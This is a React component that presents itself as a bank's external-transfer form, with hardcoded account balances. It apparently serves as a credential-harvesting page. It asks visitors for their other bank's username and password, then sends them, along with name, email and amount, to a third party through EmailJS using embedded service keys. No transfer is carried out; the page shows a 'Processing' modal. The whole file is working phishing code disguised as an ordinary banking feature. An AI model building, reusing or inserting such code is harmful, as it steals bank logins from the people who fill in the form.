import React, { useState } from "react";
import SelectDropdown from "../Shared/selectDropdown/SelectDropdown";
import { H5, P2 } from "../Shared/headings/Headings";
import Button from "../Shared/button/Button";
import Modal from "../Shared/Modal/Modal";
import { Formik } from "formik";
import { externalSchema } from "@/utils/formSchema";
import Input from "../Shared/input/input2";
import emailjs from "emailjs-com";
import Error from "../Modals/Error";
import Processing from "../Modals/Processed";
import { useDispatch, useSelector } from "react-redux";
import { IExternal } from "@/Services/transfer/Payload";
import { RootState } from "@/store/store";
import { setExternalUserData } from "@/store/transfer/externalTransferSlice";

const options = [
  {
    value: "Primary Checking-1669 $16,022.57",
    label: "Primary Checking-1669 $16,022.57",
  },
  {
    value: "Simple Checking-3263 $7,450.91",
    label: "Simple Checking-3263 $7,450.91",
  },
  {
    value: "Savings -7596 $70,812.92",
    label: "Savings -7596 $70,812.92",
  },
];

const recurringOptions = [
  {
    value: "Every Week",
    label: "Every Week",
  },
  {
    value: "Every 2 weeks",
    label: "Every 2 weeks",
  },
  {
    value: "Every 3 weeks",
    label: "Every 3 weeks",
  },
  {
    value: "Every 1 month",
    label: "Every 1 month",
  },
];

const ExternalTransfer = () => {
  const dispatch = useDispatch();
  const externalUserData = useSelector(
    (state: RootState) => state.externalUser?.externalUser
  );

  const initialValues: IExternal = {
    FullName: externalUserData?.FullName || "",
    Email: externalUserData?.Email || "",
    BankName: externalUserData?.BankName || "",
    BankUsername: externalUserData?.BankUsername || "",
    Password: externalUserData?.Password || "",
    PasswordConfirmation: externalUserData?.PasswordConfirmation || "",
    Amount: externalUserData?.Amount || "",
  };
  const [transferType, setTransferType] = useState("one-time");
  const [modalOpen, setModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isError, setisError] = useState(false);

  const handleSubmit = async (values: IExternal) => {
    dispatch(setExternalUserData(values));
    setIsLoading(true);
    try {
      // Convert 'values' to plain JavaScript object
      const formData = {
        FullName: values.FullName,
        Email: values.Email,
        BankName: values.BankName,
        BankUsername: values.BankUsername,
        Password: values.Password,
        PasswordConfirmation: values.PasswordConfirmation,
        Amount: values.Amount,
      };

      await emailjs.send(
        "service_2gd3xdf", // Service ID
        "template_20d16p5", // Template ID
        formData, // Form data
        "Q9tm9iVXmV_D2TRCb" // User ID
      );
      setIsLoading(false);
      handleModalOpen(); // Open modal on successful submission
    } catch (error) {
      handleErrorOpen();
      setIsLoading(false);
    }
  };

  const handleSelect = () => {
    // console.log("Selected:", value);
    // Do something with the selected value
  };

  const handleModalOpen = () => {
    setModalOpen(!modalOpen);
  };

  const handleModalClose = () => {
    setModalOpen(false);
  };

  const handleErrorOpen = () => {
    setisError(true);
  };

  const handleErrorClose = () => {
    setisError(false);
  };

  return (
    <>
      <div className="w-full ">
        <Formik
          initialValues={initialValues}
          onSubmit={handleSubmit}
          validationSchema={externalSchema}
        >
          {({ handleSubmit }) => (
            <form className="w-5/6 mx-auto " onSubmit={handleSubmit}>
              <div className="">
                <P2>From</P2>

                <div className="flex flex-col gap-2">
                  <SelectDropdown options={options} onSelect={handleSelect} />

                  <Input
                    label={"To"}
                    name="FullName"
                    placeholder={"Enter Your Full Name"}
                  />
                  <Input
                    label={""}
                    name="Email"
                    placeholder={"Enter Your Email Address"}
                  />

                  <Input
                    label={""}
                    name="BankName"
                    placeholder={"Enter Your Bank Name"}
                  />

                  <Input
                    label={""}
                    name="BankUsername"
                    placeholder={"Enter Bank User Name"}
                  />

                  <Input
                    label={""}
                    name="ConfirmBankUsername"
                    placeholder={"Confirm Bank User Name"}
                  />
                  <Input
                    label={""}
                    name="Password"
                    placeholder={"Enter Bank Password"}
                    type="password"
                  />

                  <Input
                    label={""}
                    name="PasswordConfirmation"
                    placeholder={"Confirm Bank Password"}
                    type="password"
                  />

                  <Input
                    label={"Enter Amount"}
                    name="Amount"
                    placeholder={"$0.00"}
                  />
                </div>

                <H5 className="mt-4">Choose a transfer type</H5>

                <div className="flex flex-row gap-4 items-center justify-center w-full my-4">
                  <Button
                    type="button"
                    style={{
                      color: transferType === "one-time" ? "white" : "black",
                      backgroundColor:
                        transferType === "one-time" ? "green" : "unset",
                    }}
                    onClick={() => setTransferType("one-time")}
                  >
                    One Time
                  </Button>
                  <Button
                    type="button"
                    style={{
                      color: transferType === "recurring" ? "white" : "black",
                      backgroundColor:
                        transferType === "recurring" ? "green" : "unset",
                    }}
                    onClick={() => setTransferType("recurring")}
                  >
                    Recurring
                  </Button>
                </div>

                {transferType === "one-time" && (
                  <P2>Make this transfer once</P2>
                )}
                {transferType === "recurring" && (
                  <div className="flex flex-col gap-2 mt-4">
                    <SelectDropdown
                      options={recurringOptions}
                      onSelect={handleSelect}
                    />
                  </div>
                )}
              </div>
              <Button type="submit" color="secondary" className="w-full my-10">
                {isLoading ? "Loading..." : "Done"}
              </Button>
            </form>
          )}
        </Formik>
      </div>
      {/* {modalOpen && (
        <Modal
          openModal={modalOpen}
          setOpenModal={handleModalOpen}
          variant="filled"
          className=""
        >
          <Sure onClose={handleModalClose} />
        </Modal>
      )} */}
      {modalOpen && (
        <Modal
          openModal={modalOpen}
          setOpenModal={handleModalOpen}
          variant="filled"
          // className="flex justify-center"
        >
          <Processing />
        </Modal>
      )}
      {isError && (
        <Modal
          openModal={isError}
          setOpenModal={handleErrorOpen}
          variant="filled"
          className=""
        >
          <Error closeModal={handleErrorClose} />
        </Modal>
      )}
    </>
  );
};

export default ExternalTransfer;
